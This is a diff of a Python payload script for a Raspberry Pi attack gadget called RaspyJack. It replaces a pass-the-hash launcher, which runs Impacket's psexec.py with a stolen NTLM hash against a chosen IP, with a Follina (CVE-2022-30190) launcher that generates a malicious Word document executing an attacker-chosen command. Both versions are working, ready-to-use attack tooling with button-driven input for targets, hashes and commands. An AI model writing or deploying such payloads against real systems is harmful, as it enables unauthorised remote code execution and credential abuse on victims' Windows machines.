@@ -1,22 +1,23 @@
 #!/usr/bin/env python3
 """
-RaspyJack *payload* – **Pass the Hash Attack**
-==============================================
-This payload performs a Pass the Hash attack, which allows an attacker
-to authenticate to a remote server by using the user's NTLM hash instead
-of their password.
+RaspyJack *payload* – **Follina Attack**
+========================================
+This payload performs a Follina attack (CVE-2022-30190) by generating a
+malicious Word document that exploits a vulnerability in the Microsoft
+Windows Support Diagnostic Tool (MSDT).
+
+**NOTE:** This is a very powerful exploit that can cause serious damage.
+Use with extreme caution.
 
 Features:
-- Interactive UI for entering the target IP, username, and NTLM hash.
-- Uses Impacket's psexec.py to perform the attack.
+- Generates a malicious Word document.
 - The attack runs in a background thread.
 - Graceful exit via KEY3 or Ctrl-C.
 
 Controls:
 - MAIN SCREEN:
     - OK: Start the attack.
-    - KEY1: Edit the target IP.
-    - KEY2: Edit the username and hash.
+    - KEY1: Edit the command to execute.
     - KEY3: Exit Payload.
 """
 
@@ -36,9 +37,7 @@ import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
-TARGET_IP = "192.168.1.100"
-USERNAME = "Administrator"
-NTLM_HASH = "00000000000000000000000000000000:00000000000000000000000000000000"
+COMMAND = "calc.exe"
 running = True
 attack_thread = None
 
@@ -60,7 +59,7 @@ signal.signal(signal.SIGTERM, cleanup)
 def draw_ui(screen_state="main", message_lines=None):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    d.text((5, 5), "Pass the Hash Attack", font=FONT_TITLE, fill="#00FF00")
+    d.text((5, 5), "Follina Attack", font=FONT_TITLE, fill="#00FF00")
     d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
 
     if message_lines:
@@ -74,31 +73,27 @@ def draw_ui(screen_state="main", message_lines=None):
             d.text((x, y_offset), line, font=FONT, fill="yellow")
             y_offset += 12
     elif screen_state == "main":
-        d.text((5, 30), f"Target: {TARGET_IP}", font=FONT, fill="white")
-        d.text((5, 50), f"User: {USERNAME}", font=FONT, fill="white")
-        d.text((5, 70), f"Hash: {NTLM_HASH[:10]}...", font=FONT, fill="white")
-        d.text((5, 100), "OK=Attack", font=FONT, fill="cyan")
-        d.text((5, 110), "KEY1=Target | KEY2=User/Hash", font=FONT, fill="cyan")
-    elif screen_state == "attacking":
-        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
-        d.text((5, 70), f"Target: {TARGET_IP}", font=FONT, fill="white")
-        d.text((5, 85), f"User: {USERNAME}", font=FONT, fill="white")
+        d.text((5, 30), f"Command: {COMMAND}", font=FONT, fill="white")
+        d.text((5, 100), "OK=Generate", font=FONT, fill="cyan")
+        d.text((5, 110), "KEY1=Command", font=FONT, fill="cyan")
+    elif screen_state == "generating":
+        d.text((5, 50), "Generating document...", font=FONT_TITLE, fill="yellow")
+        d.text((5, 70), f"Command: {COMMAND}", font=FONT, fill="white")
 
     LCD.LCD_ShowImage(img, 0, 0)
 
 def run_attack():
-    draw_ui("attacking")
+    draw_ui("generating")
     
-    # Path to psexec.py
-    psexec_path = os.path.join(RASPYJACK_ROOT, "impacket-examples", "psexec.py")
+    # Path to Follina exploit
+    follina_path = os.path.join(RASPYJACK_ROOT, "follina-exploit", "follina.py")
     
     # Command to execute
     command = [
         "python3",
-        psexec_path,
-        "-hashes",
-        NTLM_HASH,
-        f"{USERNAME}@{TARGET_IP}"
+        follina_path,
+        "-c",
+        COMMAND
     ]
     
     try:
@@ -106,23 +101,20 @@ def run_attack():
         stdout, stderr = process.communicate(timeout=600)
         
         if process.returncode == 0:
-            draw_ui(message_lines=["Attack successful!"])
+            draw_ui(message_lines=["Document generated!"])
         else:
-            draw_ui(message_lines=["Attack failed!", "Check console."])
+            draw_ui(message_lines=["Generation failed!", "Check console."])
             print(stderr)
             
     except subprocess.TimeoutExpired:
-        draw_ui(message_lines=["Attack timed out!"])
+        draw_ui(message_lines=["Generation timed out!"])
     except Exception as e:
-        draw_ui(message_lines=["Attack failed!", str(e)])
+        draw_ui(message_lines=["Generation failed!", str(e)])
         
     time.sleep(3)
 
 def handle_text_input_logic(initial_text, text_type):
-    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-:"
-    if text_type == "Target IP":
-        char_set = "0123456789."
-        
+    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/:?=& "
     char_index = 0
     input_text = ""
     
@@ -180,19 +172,9 @@ if __name__ == "__main__":
                 time.sleep(0.3)
             
             if GPIO.input(PINS["KEY1"]) == 0:
-                new_ip = handle_text_input_logic(TARGET_IP, "Target IP")
-                if new_ip:
-                    TARGET_IP = new_ip
-                time.sleep(0.3)
-
-            if GPIO.input(PINS["KEY2"]) == 0:
-                new_username = handle_text_input_logic(USERNAME, "Username")
-                if new_username:
-                    USERNAME = new_username
-                
-                new_hash = handle_text_input_logic(NTLM_HASH, "NTLM Hash")
-                if new_hash:
-                    NTLM_HASH = new_hash
+                new_command = handle_text_input_logic(COMMAND, "Command")
+                if new_command:
+                    COMMAND = new_command
                 time.sleep(0.3)
 
             if GPIO.input(PINS["KEY3"]) == 0:
@@ -207,4 +189,4 @@ if __name__ == "__main__":
         cleanup()
         LCD.LCD_Clear()
         GPIO.cleanup()
-        print("Pass the Hash Attack payload finished.")
+        print("Follina Attack payload finished.")
